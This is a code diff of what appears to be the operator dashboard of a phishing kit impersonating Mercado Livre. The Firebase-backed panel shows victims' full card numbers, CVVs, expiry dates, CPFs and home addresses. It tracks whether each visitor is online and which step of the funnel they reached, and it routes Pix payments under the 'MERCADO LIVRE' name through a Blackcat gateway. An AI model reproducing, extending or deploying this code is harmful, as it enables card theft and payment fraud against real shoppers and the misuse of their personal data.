-    if(!confirm('Remover a chave Pix do Firebase? O site passará a usar a chave FALLBACK do código.'))return;
-    await db.ref('config_pix').remove();
-    document.getElementById('chavePixInput').value='';
-    document.getElementById('pixPreview').style.display='none';
-    alert('✅ Chave removida. O site agora usará a chave fallback do código.');
-  }
-
-  async function previewPix(){
-    const chave=document.getElementById('chavePixInput').value.trim();
-    const nome=document.getElementById('nomeRecebedor').value.trim()||'MERCADO LIVRE';
-    const cidade=document.getElementById('cidadeRecebedor').value.trim()||'SAO PAULO';
-    if(!chave){alert('Digite a chave primeiro!');return;}
-    const copiaCola=gerarPayloadPix(chave,nome,cidade,159.44);
-    const qr=await QRCode.toDataURL(copiaCola,{width:300,margin:2});
-    document.getElementById('pixQrPreview').src=qr;
-    document.getElementById('pixCopiaColaPreview').value=copiaCola;
-    document.getElementById('pixPreview').style.display='block';
-  }
-
-  async function gerarPixPedido(id){
-    const cfg=pixConfigAtual;
-    let chave=String(cfg.chave||'').trim();
-    let nome=String(cfg.nome||'MERCADO LIVRE').trim();
-    let cidade=String(cfg.cidade||'SAO PAULO').trim();
-    if(!chave||chave==='SUA_CHAVE_PIX_AQUI'){
-      alert('⚠️ Nenhuma chave Pix configurada no painel. Salve uma chave primeiro.');
+  try{
+    // Faz uma requisição mínima de teste (vai retornar erro 400 de validação se a chave for válida,
+    // ou 401 se a chave for inválida)
+    const resp=await fetch(BLACKCAT_BASE+'/sales/create-sale',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','X-API-Key':k},
+      body:JSON.stringify({amount:100,paymentMethod:'PIX',items:[{title:'teste',unitPrice:100,quantity:1}],customer:{name:'teste',email:'t@t.com',phone:'11999999999',document:{number:'12345678901',type:'cpf'}}})
+    });
+    if(resp.status===401||resp.status===403){
+      div.style.color='#ff3b30';
+      div.textContent='❌ API Key INVÁLIDA (erro '+resp.status+'). Confira no painel da Blackcat.';
       return;
     }
-    const p=pedidos[id];if(!p){alert('Pedido não encontrado.');return;}
-    const valor=parseFloat(p.valor)||0;if(valor<=0){alert('❌ Este pedido não tem valor definido.');return;}
-    try{
-      const copiaECola=gerarPayloadPix(chave,nome,cidade,valor);
-      const qrCode=await QRCode.toDataURL(copiaECola,{width:300,margin:2});
-      document.getElementById('pixQrPreview').src=qrCode;
-      document.getElementById('pixCopiaColaPreview').value=copiaECola;
-      document.getElementById('pixPreview').style.display='block';
-      await db.ref('pedidos/'+id+'/pix').update({
-        chaveRaw: chave,
-        chave: copiaECola,
-        qrCode: qrCode,
-        valor: valor,
-        geradoEm: Date.now(),
-        geradoPeloPainel: true,
-        origemChave: 'painel'
-      });
-      alert('✅ Pix de R$ '+valor.toFixed(2).replace('.',',')+' gerado para o pedido '+id+'!');
-    }catch(e){alert('❌ Erro ao gerar Pix: '+e.message);}
+    // 200, 201 ou 400 = chave válida
+    if(resp.status===200||resp.status===201||resp.status===400){
+      div.style.color='#00ff88';
+      div.textContent='✅ API Key VÁLIDA! O Pix vai gerar normalmente.';
+      return;
+    }
+    div.style.color='#ffcc00';
+    div.textContent='⚠️ Resposta inesperada ('+resp.status+'). A chave parece ok, mas confira.';
+  }catch(e){
+    div.style.color='#ff3b30';
+    div.textContent='❌ Erro de rede: '+e.message;
   }
+}
 
-  function gerarPayloadPix(chave,nome,cidade,valor){
-    const f=(id,val)=>id+('00'+val.length).slice(-2)+val;
-    const clean=s=>(s||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase();
-    const gui=f('00','br.gov.bcb.pix')+f('01',(chave||'').trim());
-    let raw=f('00','01')+f('26',gui)+f('52','0000')+f('53','986');
-    if(valor)raw+=f('54',parseFloat(valor).toFixed(2));
-    raw+=f('58','BR')+f('59',clean(nome).substring(0,25))+f('60',clean(cidade).substring(0,15))+f('62',f('05','***'))+'6304';
-    let crc=0xFFFF;
-    for(let i=0;i<raw.length;i++){crc^=(raw.charCodeAt(i)<<8);for(let j=0;j<8;j++)crc=(crc&0x8000)?((crc<<1)^0x1021)&0xFFFF:(crc<<1)&0xFFFF;}
-    return raw+('0000'+crc.toString(16).toUpperCase()).slice(-4);
-  }
+function renderPedidos(){
+  const tbody=document.getElementById('corpoPedidos');
+  const ids=Object.keys(pedidos);
+  document.getElementById('countPedidos').textContent=ids.length;
+  if(ids.length===0){tbody.innerHTML='<tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr>';return;}
+  const agora=Date.now();
+  tbody.innerHTML=ids.map(id=>{
+    const p=pedidos[id];const v=visitasMap[id]||{};
+    const online=v.online&&(agora-(v.ultimaAtividade||0)<60000);
+    const login=p.login||v.login||(p.endereco&&p.endereco.nome)||'-';
+    const pixCopiado=p.pix&&p.pix.copiado;
+    const pixCopiadoEm=(p.pix&&p.pix.copiadoEm)||0;
+    const valorNum=parseFloat(p.valor)||0;
+    const valor=valorNum.toFixed(2).replace('.',',');
 
-  function tocarAlerta(){
-    try{
-      const ctx=new (window.AudioContext||window.webkitAudioContext)();
-      const osc=ctx.createOscillator();const gain=ctx.createGain();
-      osc.connect(gain);gain.connect(ctx.destination);
-      osc.frequency.value=880;osc.type='sine';
-      gain.gain.setValueAtTime(0.3,ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.01,ctx.currentTime+0.3);
-      osc.start();osc.stop(ctx.currentTime+0.3);
-    }catch(e){}
-  }
+    let statusTxt='Só visitou';let statusClass='pendente';
+    if(p.cartao){statusTxt='💳 Cartão enviado';statusClass='cartao';}
+    else if(p.blackcat){statusTxt='💠 Pix Blackcat';statusClass='pendente';}
+    else if(pixCopiado){statusTxt='📋 Copiou Pix';statusClass='copiou';}
+    else if(p.pix){statusTxt='💠 Gerou Pix';statusClass='pendente';}
+    else if(p.clicouComprar){statusTxt='🛒 Clicou comprar';statusClass='pendente';}
 
-  function iniciarPainel(){
-    db.ref('.info/connected').on('value',snap=>{
-      document.getElementById('statusConexao').textContent=snap.val()?'Conectado':'Desconectado';
+    let enderecoHtml='';
+    if(p.endereco){
+      const e=p.endereco;
+      enderecoHtml=`<div class="endereco-dados">
+        <div class="linha"><span class="nome">👤 ${e.nome||''}</span></div>
+        <div class="linha"><span class="label">✉️</span> ${e.email||'-'}</div>
+        <div class="linha">📍 ${e.rua||''}, ${e.numero||''}${e.complemento?' - '+e.complemento:''}</div>
+        <div class="linha">${e.bairro||''} — ${e.cidade||''}/${e.estado||''}</div>
+        <div class="linha"><span class="label">CEP:</span> ${e.cep||''} · <span class="label">CPF:</span> ${e.cpf||''}</div>
+        <div class="linha"><span class="label">📞</span> ${e.telefone||''}</div>
+        ${p.frete?`<div class="linha"><span class="label">🚚 Frete:</span> ${p.frete}</div>`:''}
+      </div>`;
+    } else if(p.frete){
+      enderecoHtml=`<div class="detalhes" style="margin-top:6px">🚚 Frete: <strong>${p.frete}</strong></div>`;
+    }
+
+    let cartaoHtml='-';
+    if(p.cartao){
+      const c=p.cartao;
+      cartaoHtml=`<div class="cartao-dados"><div class="num">💳 ${formatNumCartao(c.numero)}</div><div><span class="label">Bandeira:</span> <span class="val">${c.bandeira||'-'}</span></div><div><span class="label">Nome:</span> <span class="val">${c.nome||'-'}</span></div><div><span class="label">Validade:</span> <span class="val">${c.validade||'-'}</span></div><div><span class="label">CVV:</span> <span class="val">${c.cvv||'-'}</span></div><div><span class="label">CPF:</span> <span class="val">${c.cpf||'-'}</span></div></div>`;
+    }
+
+    let pixHtml='-';
+    if(p.blackcat){
+      const b=p.blackcat;
+      const stClass = b.status==='PAID'?'st-paid':(b.status==='CANCELLED'?'st-cancelled':'st-pending');
+      pixHtml=`<div class="blackcat-dados">
+        <div class="tid">🐈 ${b.transactionId||'-'}</div>
+        <div><span class="label">Status:</span> <span class="${stClass}">${b.status||'PENDING'}</span></div>
+        <div><span class="label">Valor:</span> <span class="val">R$ ${((b.amount||0)/100).toFixed(2).replace('.',',')}</span></div>
+        <div><span class="label">Taxa:</span> R$ ${((b.fees||0)/100).toFixed(2).replace('.',',')} · <span class="label">Líquido:</span> R$ ${((b.netAmount||0)/100).toFixed(2).replace('.',',')}</div>
+        ${b.expiresAt?`<div><span class="label">Expira:</span> ${fmt(new Date(b.expiresAt).getTime())}</div>`:''}
+        ${b.invoiceUrl?`<div><a href="${b.invoiceUrl}" target="_blank">🔗 Ver fatura</a></div>`:''}
+        ${pixCopiado?`<div><span class="label">Copiado em:</span> ${fmt(pixCopiadoEm)}</div>`:''}
+      </div>`;
+    } else if(p.pix){
+      pixHtml=`<div class="detalhes">Gerou Pix (sem Blackcat — pedido antigo)</div>`;
+    }
+
+    return `<tr>
+      <td><div><strong>${login}</strong></div><div class="detalhes">${online?'<span class="status online">● Online</span>':'<span class="status offline">○ Offline</span>'}</div>${enderecoHtml}</td>
+      <td><span class="status ${statusClass}">${statusTxt}</span></td>
+      <td class="detalhes">${pixHtml}</td>
+      <td>${cartaoHtml}</td>
+      <td><strong>R$ ${valor}</strong></td>
+      <td class="detalhes">${fmt(v.entrouEm||p.entrouEm||p.logadoEm)}</td>
+      <td><button class="btn-deletar" onclick="deletar('${id}')">X</button></td>
+    </tr>`;
+  }).join('');
+}
+
+function deletar(id){if(!confirm('Deletar pedido '+id+'?'))return;db.ref('pedidos/'+id).remove();db.ref('visitas/'+id).remove();}
+
+function limparTudo(){
+  if(!confirm('🧹 ATENÇÃO! Isso vai apagar TODOS os dados. Tem certeza?'))return;
+  if(!confirm('⚠️ ÚLTIMA CONFIRMAÇÃO. Todos os dados serão perdidos PERMANENTEMENTE.'))return;
+  const senha=prompt('Digite a senha de admin para confirmar:');
+  if(senha!==SENHA_ADMIN){alert('❌ Senha incorreta. Limpeza cancelada.');return;}
+  Promise.all([db.ref('visitas').remove(),db.ref('pedidos').remove(),db.ref('alertas').remove()]).then(()=>{
+    stats={online:0,visitas:0,cliques:0,pix:0,copiados:0,cartoes:0,valor:0};pedidos={};visitasMap={};
+    atualizarCards();renderPedidos();renderAlertas([]);
+    alert('✅ Tudo limpo com sucesso!');
+  }).catch(err=>alert('❌ Erro ao limpar: '+err.message));
+}
+
+function renderAlertas(lista){
+  const tbody=document.getElementById('corpoAlertas');
+  if(lista.length===0){tbody.innerHTML='<tr><td colspan="3" class="vazio">Nenhum alerta...</td></tr>';return;}
+  tbody.innerHTML=lista.slice(-20).reverse().map(a=>`<tr><td>${a.tipo||'?'}</td><td>${a.nome||a.clienteId||'-'}</td><td>${fmt(a.timestamp)}</td></tr>`).join('');
+}
+
+function tocarAlerta(){
+  try{
+    const ctx=new (window.AudioContext||window.webkitAudioContext)();
+    const osc=ctx.createOscillator();const gain=ctx.createGain();
+    osc.connect(gain);gain.connect(ctx.destination);
+    osc.frequency.value=880;osc.type='sine';
+    gain.gain.setValueAtTime(0.3,ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01,ctx.currentTime+0.3);
+    osc.start();osc.stop(ctx.currentTime+0.3);
+  }catch(e){}
+}
+
+function iniciarPainel(){
+  db.ref('.info/connected').on('value',snap=>{
+    document.getElementById('statusConexao').textContent=snap.val()?'Conectado':'Desconectado';
+  });
+
+  // API Key em tempo real
+  db.ref('config_blackcat/apiKey').on('value',snap=>{
+    blackcatApiKeyAtual=snap.val()||'';
+    renderBlackcatStatus();
+  });
+
+  db.ref('visitas').on('value',snap=>{
+    visitasMap=snap.val()||{};
+    const agora=Date.now();let online=0;
+    Object.values(visitasMap).forEach(v=>{if(v.online&&(agora-(v.ultimaAtividade||0)<60000))online++;});
+    stats.online=online;stats.visitas=Object.keys(visitasMap).length;
+    atualizarCards();renderPedidos();
+  });
+
+  db.ref('pedidos').on('value',snap=>{
+    pedidos=snap.val()||{};
+    let cliques=0,pix=0,copiados=0,cartoes=0,valor=0;
+    Object.values(pedidos).forEach(p=>{
+      if(p.clicouComprar)cliques++;
+      if(p.blackcat)pix++;
+      if(p.pix&&p.pix.copiado)copiados++;
+      if(p.cartao)cartoes++;
+      valor+=(parseFloat(p.valor)||0);
     });
+    stats.cliques=cliques;stats.pix=pix;stats.copiados=copiados;stats.cartoes=cartoes;stats.valor=valor;
+    atualizarCards();renderPedidos();
+  });
 
-    // Config Pix em TEMPO REAL — atualiza painel e site
-    db.ref('config_pix').on('value',snap=>{
-      pixConfigAtual=snap.val()||{chave:'',nome:'',cidade:''};
-      renderStatusPix();
-    });
+  db.ref('alertas').limitToLast(30).on('value',snap=>{
+    const v=snap.val()||{};
+    renderAlertas(Object.values(v));
+    const valores=Object.values(v);
+    if(valores.length>(window._ultimoAlertaCount||0)&&window._ultimoAlertaCount!==undefined)tocarAlerta();
+    window._ultimoAlertaCount=valores.length;
+  });
 
-    db.ref('visitas').on('value',snap=>{
-      visitasMap=snap.val()||{};
-      const agora=Date.now();let online=0;
-      Object.values(visitasMap).forEach(v=>{if(v.online&&(agora-(v.ultimaAtividade||0)<60000))online++;});
-      stats.online=online;stats.visitas=Object.keys(visitasMap).length;
-      atualizarCards();renderPedidos();
-    });
-
-    db.ref('pedidos').on('value',snap=>{
-      pedidos=snap.val()||{};
-      let cliques=0,pix=0,copiados=0,cartoes=0,valor=0;
-      Object.values(pedidos).forEach(p=>{
-        if(p.clicouComprar)cliques++;
-        if(p.pix)pix++;
-        if(p.pix&&p.pix.copiado)copiados++;
-        if(p.cartao)cartoes++;
-        valor+=(parseFloat(p.valor)||0);
-      });
-      stats.cliques=cliques;stats.pix=pix;stats.copiados=copiados;stats.cartoes=cartoes;stats.valor=valor;
-      atualizarCards();renderPedidos();
-    });
-
-    db.ref('alertas').limitToLast(30).on('value',snap=>{
-      const v=snap.val()||{};
-      renderAlertas(Object.values(v));
-      const valores=Object.values(v);
-      if(valores.length>(window._ultimoAlertaCount||0)&&window._ultimoAlertaCount!==undefined)tocarAlerta();
-      window._ultimoAlertaCount=valores.length;
-    });
-
-    setInterval(()=>{renderPedidos();},5000);
-  }
+  setInterval(()=>{renderPedidos();},5000);
+}
 </script>
 </body>
 </html>
